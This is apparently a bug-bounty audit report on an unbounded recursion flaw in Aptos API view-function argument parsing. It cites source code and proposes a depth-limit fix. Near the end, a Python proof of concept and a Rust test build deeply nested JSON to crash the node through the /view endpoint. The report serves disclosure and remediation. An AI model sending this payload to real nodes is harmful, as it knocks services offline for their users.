# Audit Report

## Title
Stack Overflow via Unbounded Recursive JSON Parsing in View Function Arguments

## Summary
The `ViewRequest.arguments` field accepts arbitrary nested JSON structures that are recursively parsed without depth limits in `try_into_vm_value_from_layout`, allowing an attacker to exhaust stack space and crash the API server by sending deeply nested arrays or objects to the `/view` endpoint.

## Finding Description
The vulnerability exists in the JSON-to-MoveValue conversion pipeline for view function arguments. When a `ViewRequest` is received with JSON arguments, the system converts them to Move VM values through recursive function calls without any depth checking. [1](#0-0) 

The arguments field contains `Vec<serde_json::Value>`, which can be arbitrarily nested. When these are converted: [2](#0-1) [3](#0-2) 

The conversion process calls `try_into_vm_value_from_layout`, which recursively processes vectors and structs: [4](#0-3) 

For vectors, the recursive call chain is: [5](#0-4) 

For structs, similar recursion occurs: [6](#0-5) 

**Critical Issue**: There is NO depth counter or limit check in any of these functions. The VM depth limit (`DEFAULT_MAX_VM_VALUE_NESTED_DEPTH = 128`) only applies during BCS serialization, which happens AFTER JSON parsing: [7](#0-6) 

This depth check is in the BCS serialization context, not the JSON parsing: [8](#0-7) 

An attacker can craft a request with deeply nested JSON arrays (e.g., 10,000+ levels) that fits within the 8MB request size limit but causes stack overflow during parsing.

## Impact Explanation
This vulnerability allows **Denial of Service (DoS)** attacks on API nodes, qualifying as **High Severity** per Aptos bug bounty criteria ("API crashes"). 

When the stack overflows, the tokio blocking thread panics, causing:
- Crash of the API server endpoint
- Node unavailability for view function requests
- Potential cascading failures if multiple requests are sent

This breaks the **Resource Limits** invariant: "All operations must respect gas, storage, and computational limits" - the stack exhaustion occurs before any gas metering or validation.

## Likelihood Explanation
**High likelihood** of exploitation:
- Attack requires only a single malicious HTTP POST request
- No authentication or special permissions needed
- Any view function accepting vector or struct parameters is exploitable
- Attacker can automate the attack to continuously crash nodes
- The nested structure can be algorithmically generated to bypass size limits

## Recommendation
Implement depth tracking during JSON-to-MoveValue conversion:

```rust
fn try_into_vm_value_from_layout(
    &self,
    layout: &MoveTypeLayout,
    val: Value,
    depth: u64,
) -> Result<move_core_types::value::MoveValue> {
    // Add depth check at the start
    const MAX_JSON_NESTING_DEPTH: u64 = 128;
    if depth > MAX_JSON_NESTING_DEPTH {
        bail!("JSON nesting depth {} exceeds maximum allowed depth {}", 
              depth, MAX_JSON_NESTING_DEPTH);
    }
    
    // Pass depth+1 to recursive calls
    match layout {
        MoveTypeLayout::Vector(item_layout) => {
            self.try_into_vm_value_vector(item_layout.as_ref(), val, depth + 1)?
        },
        MoveTypeLayout::Struct(struct_layout) => {
            self.try_into_vm_value_struct(struct_layout, val, depth + 1)?
        },
        // ... rest of match cases
    }
}
```

Update all recursive functions (`try_into_vm_value`, `try_into_vm_value_vector`, `try_into_vm_value_struct`) to track and validate depth.

## Proof of Concept

```python
import requests
import json

# Generate deeply nested JSON array
def create_nested_array(depth):
    result = 0
    for _ in range(depth):
        result = [result]
    return result

# Create payload with 5000 levels of nesting
nested_payload = create_nested_array(5000)

view_request = {
    "function": "0x1::coin::balance",  # Example view function
    "type_arguments": ["0x1::aptos_coin::AptosCoin"],
    "arguments": [nested_payload]  # Deeply nested array
}

# Send to Aptos node API
response = requests.post(
    "http://localhost:8080/v1/view",
    json=view_request,
    headers={"Content-Type": "application/json"}
)

# Expected: Node crashes with stack overflow
# Observed: Connection refused or timeout after crash
```

Rust test reproduction:
```rust
#[test]
fn test_deeply_nested_json_causes_stack_overflow() {
    // Create deeply nested JSON: [[[[...]]]]
    let mut json_str = "0".to_string();
    for _ in 0..5000 {
        json_str = format!("[{}]", json_str);
    }
    let nested_json: serde_json::Value = serde_json::from_str(&json_str).unwrap();
    
    let view_request = ViewRequest {
        function: EntryFunctionId::from_str("0x1::coin::balance").unwrap(),
        type_arguments: vec![],
        arguments: vec![nested_json],
    };
    
    // This will cause stack overflow when trying to convert
    let converter = MoveConverter::new(...);
    let result = converter.convert_view_function(view_request);
    // Expected: Panic due to stack overflow
}
```

### Citations

**File:** api/types/src/view.rs (L14-21)
```rust
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize, Object)]
pub struct ViewRequest {
    pub function: EntryFunctionId,
    /// Type arguments of the function
    pub type_arguments: Vec<MoveType>,
    /// Arguments of the function
    pub arguments: Vec<serde_json::Value>,
}
```

**File:** api/src/view_function.rs (L116-125)
```rust
        ViewFunctionRequest::Json(data) => state_view
            .as_converter(context.db.clone(), context.indexer_reader.clone())
            .convert_view_function(data.0)
            .map_err(|err| {
                BasicErrorWith404::bad_request_with_code(
                    err,
                    AptosErrorCode::InvalidInput,
                    &ledger_info,
                )
            })?,
```

**File:** api/types/src/convert.rs (L907-947)
```rust
    fn try_into_vm_value_from_layout(
        &self,
        layout: &MoveTypeLayout,
        val: Value,
    ) -> Result<move_core_types::value::MoveValue> {
        use move_core_types::value::MoveValue::*;
        Ok(match layout {
            MoveTypeLayout::Bool => Bool(serde_json::from_value::<bool>(val)?),
            MoveTypeLayout::U8 => U8(serde_json::from_value::<u8>(val)?),
            MoveTypeLayout::U16 => U16(serde_json::from_value::<u16>(val)?),
            MoveTypeLayout::U32 => U32(serde_json::from_value::<u32>(val)?),
            MoveTypeLayout::U64 => serde_json::from_value::<crate::U64>(val)?.into(),
            MoveTypeLayout::U128 => serde_json::from_value::<crate::U128>(val)?.into(),
            MoveTypeLayout::U256 => serde_json::from_value::<crate::U256>(val)?.into(),
            MoveTypeLayout::I8 => I8(serde_json::from_value::<i8>(val)?),
            MoveTypeLayout::I16 => I16(serde_json::from_value::<i16>(val)?),
            MoveTypeLayout::I32 => I32(serde_json::from_value::<i32>(val)?),
            MoveTypeLayout::I64 => serde_json::from_value::<crate::I64>(val)?.into(),
            MoveTypeLayout::I128 => serde_json::from_value::<crate::I128>(val)?.into(),
            MoveTypeLayout::I256 => serde_json::from_value::<crate::I256>(val)?.into(),
            MoveTypeLayout::Address => serde_json::from_value::<crate::Address>(val)?.into(),
            MoveTypeLayout::Vector(item_layout) => {
                self.try_into_vm_value_vector(item_layout.as_ref(), val)?
            },
            MoveTypeLayout::Struct(struct_layout) => {
                self.try_into_vm_value_struct(struct_layout, val)?
            },
            MoveTypeLayout::Function => {
                // TODO(#15664): do we actually need this? It appears the code here is dead and
                //   nowhere used
                bail!("unexpected move type {:?} for value {:?}", layout, val)
            },

            // Some values, e.g., signer or ones with custom serialization
            // (native), are not stored to storage and so we do not expect
            // to see them here.
            MoveTypeLayout::Signer | MoveTypeLayout::Native(..) => {
                bail!("unexpected move type {:?} for value {:?}", layout, val)
            },
        })
    }
```

**File:** api/types/src/convert.rs (L949-966)
```rust
    pub fn try_into_vm_value_vector(
        &self,
        layout: &MoveTypeLayout,
        val: Value,
    ) -> Result<move_core_types::value::MoveValue> {
        if matches!(layout, MoveTypeLayout::U8) {
            Ok(serde_json::from_value::<HexEncodedBytes>(val)?.into())
        } else if let Value::Array(list) = val {
            let vals = list
                .into_iter()
                .map(|v| self.try_into_vm_value_from_layout(layout, v))
                .collect::<Result<_>>()?;

            Ok(move_core_types::value::MoveValue::Vector(vals))
        } else {
            bail!("expected vector<{:?}>, but got: {:?}", layout, val)
        }
    }
```

**File:** api/types/src/convert.rs (L968-1009)
```rust
    pub fn try_into_vm_value_struct(
        &self,
        layout: &MoveStructLayout,
        val: Value,
    ) -> Result<move_core_types::value::MoveValue> {
        let (struct_tag, field_layouts) =
            if let MoveStructLayout::WithTypes { type_, fields } = layout {
                (type_, fields)
            } else {
                bail!(
                    "Expecting `MoveStructLayout::WithTypes`, getting {:?}",
                    layout
                );
            };
        if MoveValue::is_utf8_string(struct_tag) {
            let string = val
                .as_str()
                .ok_or_else(|| format_err!("failed to parse string::String."))?;
            return Ok(new_vm_utf8_string(string));
        }

        let mut field_values = if let Value::Object(fields) = val {
            fields
        } else {
            bail!("Expecting a JSON Map for struct.");
        };
        let fields = field_layouts
            .iter()
            .map(|field_layout| {
                let name = field_layout.name.as_str();
                let value = field_values
                    .remove(name)
                    .ok_or_else(|| format_err!("field {} not found.", name))?;
                let move_value = self.try_into_vm_value_from_layout(&field_layout.layout, value)?;
                Ok(move_value)
            })
            .collect::<Result<_>>()?;

        Ok(move_core_types::value::MoveValue::Struct(
            move_core_types::value::MoveStruct::Runtime(fields),
        ))
    }
```

**File:** api/types/src/convert.rs (L1024-1047)
```rust
    pub fn convert_view_function(&self, view_request: ViewRequest) -> Result<ViewFunction> {
        let ViewRequest {
            function,
            type_arguments,
            arguments,
        } = view_request;

        let module = function.module.clone();
        let code = self.inner.view_existing_module(&module.clone().into())? as Arc<dyn Bytecode>;
        let func = code
            .find_function(function.name.0.as_ident_str())
            .ok_or_else(|| format_err!("could not find view function by {}", function))?;
        ensure!(
            func.generic_type_params.len() == type_arguments.len(),
            "expected {} type arguments for view function {}, but got {}",
            func.generic_type_params.len(),
            function,
            type_arguments.len()
        );
        let args = self
            .try_into_vm_values(&func, &arguments)?
            .iter()
            .map(bcs::to_bytes)
            .collect::<Result<_, bcs::Error>>()?;
```

**File:** third_party/move/move-vm/types/src/values/values_impl.rs (L50-57)
```rust
/// Values can be recursive, and so it is important that we do not use recursive algorithms over
/// deeply nested values as it can cause stack overflow. Since it is not always possible to avoid
/// recursion, we opt for a reasonable limit on VM value depth. It is defined in Move VM config,
/// but since it is difficult to propagate config context everywhere, we use this constant.
///
/// IMPORTANT: When changing this constant, make sure it is in-sync with one in VM config (it is
/// used there now).
pub const DEFAULT_MAX_VM_VALUE_NESTED_DEPTH: u64 = 128;
```

**File:** third_party/move/move-vm/types/src/value_serde.rs (L98-110)
```rust
    /// Maximum allowed depth of a VM value. Enforced by serializer.
    pub(crate) max_value_nested_depth: Option<u64>,
}

impl<'a> ValueSerDeContext<'a> {
    /// Default (de)serializer that disallows delayed fields.
    pub fn new(max_value_nested_depth: Option<u64>) -> Self {
        Self {
            function_extension: None,
            delayed_fields_extension: None,
            legacy_signer: false,
            max_value_nested_depth,
        }
```
